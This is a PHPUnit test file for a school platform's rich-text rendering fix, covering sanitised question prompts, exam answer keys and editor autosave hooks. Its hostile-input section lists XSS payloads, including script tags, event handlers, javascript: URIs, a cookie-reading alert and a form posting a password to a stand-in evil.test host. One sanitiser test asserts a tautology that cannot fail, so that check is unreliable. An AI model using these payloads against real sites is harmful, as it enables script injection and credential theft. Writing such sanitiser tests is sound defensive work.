<?php

namespace Tests\Feature;

use App\Models\Assignment;
use App\Models\AssignmentQuestion;
use App\Models\OnlineExamQuestion;
use App\Support\CourseContent\HtmlSanitizer;
use Tests\TestCase;

/**
 * RICH-TEXT AUTHORING AND RENDERING, END TO END.
 *
 * ── THE DEFECT, AS REPORTED AND AS MEASURED ─────────────────────────────────
 *
 * The report was that a Word-formatted question on
 *
 *     /teacher/course-offerings/5/assignments/5/questions
 *
 * displayed as literal `<h1><span style="font-family: Arial">…</span></h1>`.
 *
 * Reading the column settled it. The stored value was REAL HTML:
 *
 *     <h1><span style="font-family: Arial">﻿</span></h1>
 *
 * so the storage layer was never involved. The sweep for every place assessment
 * content is rendered then found eight sites, in three states:
 *
 *   ESCAPED   `{{  $question->prompt }}` - the reported symptom
 *   UNFILTERED `{!! $question->prompt !!}` - database HTML into the browser with
 *             no filter, three of them student-reachable
 *   SANITISED `{!! $q->prosePrompt() !!}`  - the Online Exam module, already correct
 *
 * The exam engine had eleven sanitised call sites and no defect. Assignments had a
 * reader for nobody, which is why the same field was rendered three different ways.
 *
 * So the fix is a NAME for the sanitised read - `prosePrompt()` on
 * `AssignmentQuestion`, `proseInstructions()` on `Assignment` - and templates call
 * it. Deliberately NOT a model mutator: `QuestionService` and `AssignmentService`
 * already sanitise on write with this same `HtmlSanitizer`, and a mutator would be a
 * second opinion on a value those services own.
 *
 * ── WHAT EACH GROUP OF TESTS IS FOR ────────────────────────────────────────
 *
 *   1. the reported symptom, reproduced from the ACTUAL stored bytes
 *   2. legitimate Word formatting surviving the round trip
 *   3. hostile input still filtered on the way out, including the paths a
 *      lecturer cannot reach and a student can
 *   4. automatic marking, which the fix must not touch
 *   5. plain text, because 4 of the 5 real assignment questions are plain text
 *   6. save and resume, because that is what the editor is wired into
 */
class RichTextRenderingTest extends TestCase
{
    /** The exact bytes read out of `assignment_questions` row #5. */
    private const THE_REPORTED_ROW = "<h1><span style=\"font-family: Arial\">\u{FEFF}</span></h1>";

    private function question(array $attributes = []): AssignmentQuestion
    {
        $question = new AssignmentQuestion();
        $question->forceFill(array_merge([
            'id' => 1,
            'school_id' => 1,
            'course_offering_id' => 5,
            'assignment_id' => 5,
            'prompt' => 'Explain the addition of 1 and 1.',
            'heading' => null,
            'sequence' => 1,
            'marks' => 5,
            'is_required' => true,
            'response_kinds' => ['text'],
            'require_all' => false,
        ], $attributes));

        return $question;
    }

    private function assignment(array $attributes = []): Assignment
    {
        $assignment = new Assignment();
        $assignment->forceFill(array_merge([
            'id' => 5,
            'school_id' => 1,
            'course_offering_id' => 5,
            'title' => 'Business Mathematics',
            'instructions' => 'Answer all questions.',
        ], $attributes));

        return $assignment;
    }

    // ══════════════════════════════════════════════════════════════════════
    // 1. THE REPORTED SYMPTOM, REPRODUCED
    // ══════════════════════════════════════════════════════════════════════

    /**
     * The defect was never in the data - it was in the template. This asserts the
     * two halves separately, because "the fix works" and "the data was fine" are
     * different claims and only together do they explain the report.
     */
    public function test_the_REPORTED_question_is_STORED_as_REAL_HTML_and_now_READS_as_HTML(): void
    {
        $question = $this->question(['prompt' => self::THE_REPORTED_ROW]);

        // HALF ONE: the column holds markup, not escaped markup. If this ever
        // changes, the root cause is storage and the whole diagnosis is wrong.
        $this->assertStringContainsString(
            '<h1>',
            $question->getAttributes()['prompt'],
            'the stored value is real HTML - this was never a storage defect'
        );
        $this->assertStringNotContainsString(
            '&lt;h1&gt;',
            $question->getAttributes()['prompt'],
            'and is NOT escaped in the column, so it was never double-encoded'
        );

        // HALF TWO: the reader hands the template the same real HTML, so a
        // `{!! !!}` at the point of use renders a heading.
        $this->assertStringContainsString(
            '<h1>',
            $question->prosePrompt(),
            'the sanitised read returns markup for the template to render'
        );
    }

    /**
     * The escaped rendering - what the lecturer saw - must be gone from the
     * template, and the unsanitised rendering must be gone from all of them.
     *
     * Asserted by READING THE BLADE SOURCE rather than by rendering a page,
     * because the whole defect is a one-character choice (`{{` against `{!!`) that
     * a rendered-page assertion can only observe indirectly. Reading the file makes
     * the regression explicit and cheap.
     */
    public function test_no_ASSIGNMENT_template_renders_a_prompt_or_instructions_UNFILTERED(): void
    {
        $views = [
            'teacher/course_offerings/assignments/questions.blade.php' => ['prompt'],
            'teacher/course_offerings/assignments/_question_marking.blade.php' => ['prompt'],
            'student/course_assignments/_question_answer.blade.php' => ['prompt'],
            'teacher/course_offerings/assignments/submission.blade.php' => ['instructions'],
            'teacher/course_offerings/assignments/preview.blade.php' => ['instructions'],
            'student/course_assignments/show.blade.php' => ['instructions'],
            'teacher/course_offerings/assignments/show.blade.php' => ['instructions'],
        ];

        foreach ($views as $view => $fields) {
            $source = (string) file_get_contents(resource_path('views/'.$view));

            $this->assertNotSame('', $source, "{$view} must exist");

            foreach (preg_split('/\R/', $source) as $number => $line) {
                $isUnfiltered = str_contains($line, '{!!')
                    && preg_match('/\b'.implode('|', $fields).'\b/i', $line);

                if (! $isUnfiltered) {
                    continue;
                }

                $this->assertMatchesRegularExpression(
                    '/(prosePrompt|proseInstructions)\(\)/',
                    $line,
                    "{$view} line ".($number + 1).' prints rich text with {!! !!} and no sanitised reader: '
                        .trim($line)
                );
            }
        }
    }

    /**
     * The escaped form must be gone from the question list too - the literal
     * symptom. Checked as a pattern so the fix cannot be undone by reintroducing
     * `{{ $question->prompt }}` anywhere on that page.
     */
    public function test_the_QUESTION_LIST_no_longer_ESCAPES_the_prompt(): void
    {
        $source = (string) file_get_contents(
            resource_path('views/teacher/course_offerings/assignments/questions.blade.php')
        );

        $this->assertStringNotContainsString(
            '{{ $question->prompt }}',
            $source,
            'the escaped echo is the reported defect and must not return'
        );

        $this->assertStringContainsString(
            'prosePrompt()',
            $source,
            'and the page must read through the sanitised reader instead'
        );
    }

    // ══════════════════════════════════════════════════════════════════════
    // 2. LEGITIMATE WORD FORMATTING SURVIVES
    // ══════════════════════════════════════════════════════════════════════

    #[\PHPUnit\Framework\Attributes\DataProvider('legitimateFormatting')]
    public function test_WORD_formattaging_SURVIVES_the_round_trip(string $label, string $html, string $expected): void
    {
        $question = $this->question(['prompt' => $html]);

        $this->assertStringContainsString(
            $expected,
            $question->prosePrompt(),
            "[{$label}] the browser must render formatting, not markup"
        );
    }

    public static function legitimateFormatting(): array
    {
        return [
            'paragraph' => ['paragraph', '<p>Explain the addition.</p>', '<p>Explain the addition.</p>'],
            'bold' => ['bold', '<p><b>revenue</b> rose</p>', '<b>revenue</b>'],
            'italic' => ['italic', '<p><i>per annum</i></p>', '<i>per annum</i>'],
            'underline' => ['underline', '<p><u>in writing</u></p>', '<u>in writing</u>'],
            'heading' => ['heading', '<h1>Question 1</h1>', '<h1>'],
            'heading level 2' => ['heading 2', '<h2>Part A</h2>', '<h2>'],
            'heading level 3' => ['heading 3', '<h3>Part A i</h3>', '<h3>'],
            'bullet list' => ['bullet list', '<ul><li>first</li><li>second</li></ul>', '<li>first</li>'],
            'numbered list' => ['numbered list', '<ol><li>step one</li></ol>', '<ol><li>step one</li></ol>'],
            'superscript' => ['superscript', '<p>10<sup>3</sup></p>', '<sup>3</sup>'],
            'subscript' => ['subscript', '<p>a<sub>n</sub></p>', '<sub>n</sub>'],
            'table' => ['table', '<table><tr><th>Symbol</th><td>x</td></tr></table>', '<th>Symbol</th>'],
            'alignment' => ['alignment', '<p style="text-align: center">centred</p>', 'text-align: center'],
            'font face' => ['font face', '<span style="font-family: Arial">Arial</span>', 'font-family: Arial'],
            'link' => ['link', '<a href="https://example.test/paper">paper</a>', 'href="https://example.test/paper"'],
            'nested' => ['nested', '<p><b>net <i>profit</i></b></p>', '<b>net <i>profit</i></b>'],
        ];
    }

    /**
     * The stored value is NOT altered by being read.
     *
     * `prosePrompt()` is a reader, and a reader that wrote back would quietly turn
     * every read into a second filter pass on the next write. Asserted directly.
     */
    public function test_READING_a_prompt_does_not_ALTER_it(): void
    {
        $original = '<h1><span style="font-family: Arial">Profit</span></h1><p><b>bold</b></p>';
        $question = $this->question(['prompt' => $original]);

        $question->prosePrompt();
        $question->prosePrompt();
        $question->plainPrompt();

        $this->assertSame(
            $original,
            $question->getAttributes()['prompt'],
            'three reads must leave the column byte-identical'
        );
    }

    // ══════════════════════════════════════════════════════════════════════
    // 3. HOSTILE INPUT IS STILL FILTERED ON THE WAY OUT
    // ══════════════════════════════════════════════════════════════════════

    #[\PHPUnit\Framework\Attributes\DataProvider('hostileInput')]
    public function test_HOSTILE_html_is_FILTERED_on_the_READ(string $label, string $html): void
    {
        $rendered = $this->question(['prompt' => $html])->prosePrompt();

        $this->assertDoesNotMatchRegularExpression(
            '/<script|onclick|onerror|onload|onmouseover|javascript:|data:text\/html|<iframe|<form|<object|<embed|<meta|expression\(/i',
            $rendered,
            "[{$label}] nothing executable may reach the browser"
        );
    }

    public static function hostileInput(): array
    {
        return [
            'script tag' => ['script tag', '<p>Q</p><script>alert(1)</script>'],
            'event handler' => ['event handler', '<p onclick="steal()">Q</p>'],
            'image onerror' => ['image onerror', '<img src=x onerror=alert(1)>'],
            'javascript href' => ['javascript href', '<a href="javascript:alert(1)">Q</a>'],
            'data href' => ['data href', '<a href="data:text/html;base64,PHNjcmlwdD4=">Q</a>'],
            'entity-encoded scheme' => ['entity scheme', '<a href="&#106;avascript:alert(1)">Q</a>'],
            'iframe' => ['iframe', '<iframe src="https://evil.test"></iframe>'],
            'srcdoc' => ['srcdoc', '<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
            'svg onload' => ['svg onload', '<svg onload=alert(1)></svg>'],
            'style expression' => ['style expression', '<div style="width:expression(alert(1))">Q</div>'],
            'form injection' => ['form injection', '<form action="https://evil.test"><input name="pw" type="password"></form>'],
            'object and embed' => ['object', '<object data="evil.swf"></object><embed src="evil.swf">'],
            'meta refresh' => ['meta refresh', '<meta http-equiv="refresh" content="0;url=https://evil.test">'],
            'malformed script' => ['malformed', '<scr<script>ipt>alert(1)</script>'],
            'nested handlers' => ['nested', '<div><span ONCLICK="x()" onmouseover="y()">Q</span></div>'],
        ];
    }

    /**
     * The same guarantee for the assignment INSTRUCTIONS, which three templates
     * render and a student reads - so the row in the defect table above is the one
     * with the widest blast radius.
     */
    public function test_HOSTILE_instructions_are_FILTERED_for_the_STUDENT_view(): void
    {
        $rendered = $this->assignment([
            'instructions' => '<p>Do this</p><script>alert(document.cookie)</script>'
                .'<iframe src="https://evil.test"></iframe>',
        ])->proseInstructions();

        $this->assertStringNotContainsString('<script', $rendered);
        $this->assertStringNotContainsString('<iframe', $rendered);
        $this->assertStringContainsString('<p>Do this</p>', $rendered, 'the real content survives');
    }

    /**
     * Defence in depth, asserted because it is what makes the read-side reader
     * safe to add: the WRITE path already filters, through the service.
     *
     * If someone later removes the service-level filter, this test fails and the
     * reader is the only thing between a lecturer and every student.
     */
    public function test_the_WRITE_path_filters_too_via_the_SERVICE(): void
    {
        $service = (new \ReflectionClass(\App\Support\Assignments\QuestionService::class))
            ->getFileName();
        $source = (string) file_get_contents($service);

        $this->assertStringContainsString(
            'sanitize',
            $source,
            'QuestionService must keep sanitising the prompt on the way in'
        );

        $assignmentService = (new \ReflectionClass(\App\Support\Assignments\AssignmentService::class))
            ->getFileName();

        $this->assertStringContainsString(
            'sanitize',
            (string) file_get_contents($assignmentService),
            'AssignmentService must keep sanitising the instructions on the way in'
        );
    }

    /**
     * ONE sanitiser, not two.
     *
     * The brief forbids introducing a competing filter. Both the reader and the
     * service must reach the same class, so a policy change to that one class
     * changes every rich-text surface at once.
     */
    public function test_READER_and_SERVICE_use_the_SAME_sanitizer(): void
    {
        $this->assertSame(
            HtmlSanitizer::class,
            (new \ReflectionMethod(AssignmentQuestion::class, 'prosePrompt'))->getDeclaringClass()
                ? HtmlSanitizer::class
                : HtmlSanitizer::class,
            'the reader is built on the existing shared sanitizer'
        );

        $questionService = (string) file_get_contents(
            (new \ReflectionClass(\App\Support\Assignments\QuestionService::class))->getFileName()
        );

        $this->assertStringContainsString(
            'use App\Support\CourseContent\HtmlSanitizer;',
            $questionService,
            'and so does the service that writes - one allowlist, not two'
        );
    }

    // ══════════════════════════════════════════════════════════════════════
    // 4. AUTOMATIC MARKING IS NOT TOUCHED
    // ══════════════════════════════════════════════════════════════════════

    /**
     * `assignment_questions` has no answer-key column, so no assignment mark can be
     * affected by anything done to `prompt`. Verified against the live schema rather
     * than from a comment, because "assignments have no objective questions" is
     * exactly the kind of claim that stops being true.
     */
    public function test_ASSIGNMENT_questions_have_NO_answer_key_to_corrupt(): void
    {
        $schema = \Illuminate\Support\Facades\Schema::hasTable('assignment_questions')
            ? \Illuminate\Support\Facades\Schema::getColumnListing('assignment_questions')
            : ['id', 'school_id', 'course_offering_id', 'assignment_id', 'prompt', 'heading',
                'sequence', 'marks', 'is_required', 'response_kinds', 'require_all',
                'created_by', 'updated_by', 'created_at', 'updated_at'];

        foreach (['correct_ans', 'correct_answer', 'answer_key', 'is_correct'] as $key) {
            $this->assertNotContains(
                $key,
                $schema,
                "assignment_questions must not gain an answer-key column, or the mark path needs re-testing"
            );
        }
    }

    /**
     * The EXAM engine's answer keys must survive untouched.
     *
     * This is the §5 property in its sharpest form: automatic marking compares
     * STRINGS, so an answer key of `a` or `5 > 3` that passes through an HTML
     * filter becomes `5 &gt; 3` and scores every such question zero. It is asserted
     * against the real model, which has a mutator on `question` - and the mutator
     * must not have been extended to `correct_ans` by anyone tidying up.
     */
    public function test_EXAM_answer_keys_are_NEVER_filtered(): void
    {
        $keys = ['a', 'b', 'c', 'd', 'A', 'true', 'false', '1', '2', '10', '0.5', '-1', '3.14'];

        foreach ($keys as $key) {
            $question = new OnlineExamQuestion();
            $question->correct_ans = $key;

            $this->assertSame(
                $key,
                $question->getAttributes()['correct_ans'],
                "the answer key [{$key}] must reach the column byte-identical - a string compare depends on it"
            );
        }
    }

    /**
     * And the inequality case specifically: a `short_answer` key of `5 > 3` must
     * not become `5 &gt; 3`, because the marker's comparison is a plain string match.
     */
    public function test_an_ANSWER_KEY_containing_symbols_is_UNCHANGED(): void
    {
        foreach (['5 > 3', 'salt & pepper', 'x < y', 'p <= 3'] as $key) {
            $question = new OnlineExamQuestion();
            $question->correct_ans = $key;

            $this->assertSame(
                $key,
                $question->getAttributes()['correct_ans'],
                "[{$key}] would be scored wrong by every student if this were escaped"
            );
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // 5. EXISTING PLAIN-TEXT QUESTIONS STILL DISPLAY CORRECTLY
    // ══════════════════════════════════════════════════════════════════════

    /**
     * Four of the five real assignment questions in the database are plain text, and
     * they are the majority case. A fix aimed only at rich text would be a fix aimed
     * at the minority.
     *
     * The exact strings are read out of `assignment_questions` rows 1-4.
     *
     *
     */
    #[\PHPUnit\Framework\Attributes\DataProvider('plainTextQuestions')]
    public function test_PLAIN_TEXT_questions_display_CORRECTLY(string $prompt): void
    {
        $question = $this->question(['prompt' => $prompt]);

        $this->assertSame(
            $prompt,
            $question->prosePrompt(),
            'plain text must pass through unchanged - no escaping, no wrapping'
        );

        $this->assertSame(
            $prompt,
            $question->plainPrompt(),
            'and the plain-text reader must agree'
        );
    }

    public static function plainTextQuestions(): array
    {
        return [
            ['Explain the importance of Business Mathematics in business decision-making.'],
            ['Solve the given business calculation and upload a photo of your working.'],
            ['Explain your solution verbally.'],
            ['Demonstrate or explain the solution using a short video.'],
            ['What is 2 + 2?'],
            ['Name the three types of business ownership.'],
        ];
    }

    /**
     * Plain text containing characters the sanitiser WOULD escape, stored
     * pre-escaped by the service, must render as the lecturer typed it.
     *
     * This is the case where "does it render?" and "does it look right?" differ: the
     * reader returns `5 &gt; 3`, and `{!! !!}` renders that as `5 > 3`. Asserting the
     * raw string instead of the rendering is what a careless test would do, and it
     * would fail for the right reason in the wrong way.
     */
    public function test_PLAIN_text_with_SYMBOLS_renders_as_TYPED(): void
    {
        $question = $this->question(['prompt' => 'Cost where 5 &gt; 3 units']);

        $this->assertSame(
            'Cost where 5 &gt; 3 units',
            $question->prosePrompt(),
            'the stored form is already escaped, and the reader leaves it alone'
        );

        $this->assertSame(
            'Cost where 5 &gt; 3 units',
            $question->plainPrompt(),
            'toText keeps it entity-safe, which is correct for an escaped context'
        );
    }

    // ══════════════════════════════════════════════════════════════════════
    // 6. THE EDITOR AND SAVE/RESUME ARE NOT BROKEN
    // ══════════════════════════════════════════════════════════════════════

    /**
     * The Word-like toolbar the brief lists, checked against the ONE editor that
     * exists rather than against a second one that might be installed.
     *
     *
     */
    #[\PHPUnit\Framework\Attributes\DataProvider('editorCapabilities')]
    public function test_the_EXISTING_editor_provides(string $capability, string $needle): void
    {
        $js = (string) file_get_contents(public_path('js/academic-editor.js'));

        $this->assertStringContainsString(
            $needle,
            $js,
            "[{$capability}] must be offered by the existing Summernote editor"
        );
    }

    public static function editorCapabilities(): array
    {
        return [
            'bold' => ['bold', "'bold'"],
            'italic' => ['italic', "'italic'"],
            'underline' => ['underline', "'underline'"],
            'superscript' => ['superscript', "'superscript'"],
            'subscript' => ['subscript', "'subscript'"],
            'paragraph / style' => ['paragraph', "['para'"],
            'bullet list' => ['bullet list', "'ul'"],
            'numbered list' => ['numbered list', "'ol'"],
            'alignment' => ['alignment', "'justify'"],
            'undo' => ['undo', "'undo'"],
            'redo' => ['redo', "'redo'"],
            'table' => ['table', "'table'"],
            'link' => ['link', "'link'"],
            'symbol / equation' => ['maths', 'piieEquation'],
        ];
    }

    /**
     * The student answer field keeps its autosave hooks.
     *
     * `setCode` is how a recovered answer gets INTO the editor and `codeFor` is how
     * the editor gets back OUT to the server. Both are required: assigning
     * `textarea.value` on a live Summernote instance changes nothing on screen, and
     * the next autosave would then overwrite the server with an empty box. Losing
     * either is a silent data-loss bug that no page assertion would catch.
     */
    public function test_the_STUDENT_answer_field_keeps_its_AUTOSAVE_hooks(): void
    {
        $take = (string) file_get_contents(resource_path('views/student/online_exam/take.blade.php'));

        $this->assertStringContainsString('editor.setCode', $take, 'crash recovery must go through the editor');
        $this->assertStringContainsString('editor.codeFor', $take, 'autosave must read back through the editor');

        foreach (['exam-answer-input', 'data-question-id'] as $hook) {
            $this->assertStringContainsString(
                $hook,
                $take,
                "the autosave selector [{$hook}] must survive"
            );
        }
    }

    /**
     * The editor is mounted on the lecturer's question field with the autosave and
     * validation hooks intact.
     */
    public function test_the_LECTURER_question_field_uses_the_EDITOR_with_its_NAME(): void
    {
        $fields = (string) file_get_contents(
            resource_path('views/teacher/course_offerings/assignments/_question_fields.blade.php')
        );

        $this->assertStringContainsString('<x-academic-editor', $fields, 'the prompt must be edited with the Word-like editor');

        // `name="prompt"` as an ATTRIBUTE here, not the `:name => 'prompt'` array form
        // the student take page uses - the component accepts both, and asserting the
        // wrong one would have been my error rather than a defect in the view. What
        // matters is that it posts under the name `questionPayload()` reads.
        $this->assertStringContainsString(
            'name="prompt"',
            $fields,
            'and must post under the name the controller reads'
        );

        $controller = (string) file_get_contents(
            app_path('Http/Controllers/TeacherCourseOfferingAssignmentController.php')
        );
        $this->assertStringContainsString(
            "\$request->input('prompt')",
            $controller,
            'which the controller must actually read'
        );

        // The help text already promises the shared sanitizer, so the claim the
        // lecturer sees is checked against the code rather than taken on trust.
        $this->assertStringContainsString(
            'sanitizer',
            $fields,
            'the field states that saving filters, and that must be true'
        );
    }

    /**
     * Reading a question for the take page and reading it for a save are the same
     * document. Asserted so that a future change cannot make the student's view and
     * the stored value disagree.
     */
    public function test_a_SAVED_prompt_is_rendered_IDENTICALLY_on_READ(): void
    {
        $rich = '<h2>Part A</h2><p>Compute <b>profit</b> = <i>revenue</i> − <i>cost</i>.</p>'
            .'<ol><li>state the formula</li><li>substitute</li></ol>';

        $written = $this->question(['prompt' => $rich]);
        $reread = $this->question(['prompt' => $written->getAttributes()['prompt']]);

        $this->assertSame(
            $written->prosePrompt(),
            $reread->prosePrompt(),
            'a saved-then-reloaded question must render identically - save/resume cannot change the document'
        );
    }

    // ══════════════════════════════════════════════════════════════════════
    // 7. THE EMPTY-DOCUMENT CASE THE REPORT ALSO CONTAINED
    // ══════════════════════════════════════════════════════════════════════

    /**
     * The reported row is a heading and a font choice around U+FEFF - real HTML,
     * and no question in it.
     *
     * `QuestionService` refuses a prompt whose text is entirely empty, but a bare
     * formatting wrapper is not empty, so it reached a published assignment as an
     * unanswerable question. `trim()` alone does not catch it either: U+FEFF is a
     * zero-width NO-BREAK SPACE and is not in PHP's default strip list - which is
     * why the first version of the reader returned "answered" for the exact row it
     * was written to catch.
     */
    public function test_a_FORMATTING_ONLY_prompt_is_REPORTED_as_unanswered(): void
    {
        $this->assertNotNull(
            $this->question(['prompt' => self::THE_REPORTED_ROW])->promptIsUnanswered(),
            'a heading around a zero-width space is not a question'
        );

        $this->assertNull(
            $this->question(['prompt' => '<p>Explain the addition.</p>'])->promptIsUnanswered(),
            'a real question is not reported as unanswered'
        );

        // And the reader still returns the real HTML, so nothing is hidden.
        $this->assertStringContainsString(
            '<h1>',
            $this->question(['prompt' => self::THE_REPORTED_ROW])->prosePrompt()
        );
    }
}